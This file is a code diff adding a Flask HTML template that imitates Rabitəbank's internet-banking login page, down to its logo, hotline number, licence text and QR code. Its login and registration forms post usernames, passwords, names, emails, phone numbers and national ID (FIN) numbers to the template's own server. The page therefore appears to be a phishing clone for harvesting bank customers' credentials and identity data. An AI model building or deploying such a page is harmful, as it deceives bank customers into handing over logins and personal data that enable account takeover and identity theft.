@@ -1,0 +1,186 @@
+
+<title>Internet Banking</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='css/internetbk.css') }}">
+<link rel="icon" type="image/png" sizes="96x96" href="{{ url_for('static', filename='img/favicon-96x96.png') }}">
+
+<body style="font-family: sans-serif;">
+    <div id="container" class="landing-container">
+        <div class="main-container" id="page-content">
+            <div class="d-block overflow-hidden"></div> 
+                <div class="d-flex align-items-center justify-content-between">
+                    <div class="d-flex align-items-center">
+                        <a href="/" class="mr-40">
+                            <img alt="Rabitə Bank" src="{{ url_for('static', filename='img/rabitabank-logo-new-svg.svg') }}"></a> 
+                        <div class="langs">
+                            <a href="#" class="active">AZ</a>
+                            <a href="#" class="">EN</a>
+                            <a href="#" class="">RU</a>
+                        </div>
+                    </div> 
+                    <div>
+                        <a href="tel:133" class="telto  d-flex align-items-center">                          
+                                133
+                        </a>
+                    </div>
+                </div> 
+
+    <section class="landing">
+    <div class="right">
+        <div class="carousel">
+            <div class="slide">
+              <img style="border-radius: 15px;" src="{{ url_for('static', filename='img/emekhaqqi.png') }}" alt="Resim 1">
+            </div>
+            <div class="slide">
+              <img style="border-radius: 15px;" src="{{ url_for('static', filename='img/hesabfaktura.png') }}" alt="Resim 2">
+            </div>
+            <div class="slide">
+              <img style="border-radius: 15px;" src="{{ url_for('static', filename='img/eximcard.png') }}" alt="Resim 3">
+            </div>
+          </div>
+          
+          <div class="controls">
+            <div class="dot" onclick="currentSlide(1)"></div>
+            <div class="dot" onclick="currentSlide(2)"></div>
+            <div class="dot" onclick="currentSlide(3)"></div>
+          </div>
+                   
+    </div>
+
+    <div class="left ps">
+        <div class="login">
+            <div class="content">
+                <div class="container-fluid">
+                    <ul class="tab-links-list login-type-selector salam_22">
+                        <li onclick="changeTab(event, 'login')" class="tab-link-item">
+                            Giris et
+                        </li> 
+                        <li onclick="changeTab(event, 'register')" data-v-c284ec7a="" class="tab-link-item">
+                            Qeydiyyat
+                        </li>
+                    </ul> 
+
+    <div class="row tabs">
+                    <ul class="nav p-t-20 nav-tabs left-tabs">
+                        <li role="presentation" class="active">
+                            <a style="font-family: sans-serif;" href="#">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                                    <path fill="#76bc21" fill-rule="nonzero" d="M12 3.984c1.125.032 2.063.422 2.813 1.172s1.124 1.696 1.124 2.836-.374 2.086-1.124 2.836c-.75.75-1.688 1.125-2.813 1.125-1.125 0-2.062-.375-2.813-1.125-.75-.75-1.124-1.695-1.124-2.836 0-1.14.374-2.086 1.124-2.836.75-.75 1.688-1.14 2.813-1.172zm0 10.032c2.281.03 4.172.421 5.672 1.171s2.281 1.688 2.344 2.813v2.016H3.984V18c.063-1.125.844-2.062 2.344-2.813 1.5-.75 3.39-1.14 5.672-1.171z">
+                                    </path>
+                                </svg>
+                            Müştəri nömrəsilə
+                            </a>
+                        </li>
+                        <li role="presentation" class="">
+                            <a style="font-family: sans-serif;" href="/tezliklə" target="_blank">
+                                    <img src="{{ url_for('static', filename='img/asan.png') }}" alt="">
+                            ASAN İmza vasitəsilə
+                            </a>
+                        </li>
+                    </ul>
+</div>
+    <div class="salam_33" id="login">
+        <form action="" method="POST">
+            {{ form.csrf_token }}
+            <div class="tab">
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">İstifadəçi adı</div>
+                    {{ form.username }}
+                </div>
+                <div class="row user-pass">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">Şifrəniz</div> 
+                    {{ form.password(style="-webkit-text-security: disc;font-family: sans-serif;") }}
+                </div>
+            </div>
+        
+            <div style="margin-top: -50px;" class="form-buttons">
+                <button type="submit" style="font-family: sans-serif;" class="btn buton_2 custom-button">
+                Giriş
+                </button> 
+                {% if error %}
+            <p style="color:red; text-align: center;">{{ error }}</p>
+          {% endif %}
+                <div  style="font-family: sans-serif;" class="forgot-pass  text-center">
+                Şifrəni unutmusunuz?
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="salam_33" id="register">
+        <form action="" method="post">
+            {{ yeni.csrf_token }}
+            <div class="tab">
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">İstifadəçi adı</div>
+                    {{ yeni.username }}
+                </div>
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">E-mail</div>
+                    {{ yeni.email }}                
+                </div>
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">Ad</div>
+                    {{ yeni.name }} 
+                </div>
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">Soyad</div>
+                    {{ yeni.last_name }} 
+                </div>
+                <div class="row user-id">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">Mobil nömrəniz</div>
+                    {{ yeni.phone }} 
+                </div>
+        
+                <div class="row user-pass">
+                    <div  style="font-family: sans-serif;" class="f-14 pb-10">Şifrə</div> 
+                    {{ yeni.password(style="-webkit-text-security: disc; font-family: sans-serif;") }} 
+                </div>
+    
+                <div class="row user-pass">
+                    {{ yeni.fin }} 
+                </div>
+            </div>
+            <div style="margin-top: -50px;" class="form-buttons">
+                <button type="submit" style="font-family: sans-serif;" class="btn btn-primary dark custom-button">
+                Başla
+                </button> 
+            </div>
+        </form>
+    </div>
+
+</div>
+
+    <span class="w-100 align-items-center qr-main d-flex">
+        <div class="qr-row">
+            <div class="qr-code h-100 img-rounded">
+                <div title="xZFwn0+zU3FLjtw1wVKMc5T++uOeaqrqT9TS8DvPUsw=">
+                    <canvas width="160" height="160" style="display: none !important;">
+                    </canvas>
+                    <img alt="Scan me!" style="display: block !important; width: 80px;" src="data:image/png;base64,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">
+                </div>
+            </div>
+        </div> 
+        <div>
+        <span class="f-16">
+            QR vasitəsilə giriş,RabitaMobile tətbiqindən istifadə edin.
+        </span>
+        </div>
+    </span>
+    </div> 
+</div>
+</div>
+</section>
+
+<div class="d-flex footer mt-3 justify-content-between">
+    <div class="text">
+        Rabitəbank ASC Azərbaycan Mərkəzi Bankın 136 saylı
+        lisenziyası əsasında fəaliyyət göstərir. © Rabitəbank 2023
+    </div> 
+</div>
+
+    </div> 
+</div>
+        <script src="{{ url_for('static', filename='js/internetbank.js') }}"></script>
+        <script src="{{ url_for('static', filename='js/svg-symbols.js') }}"></script>
+        <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
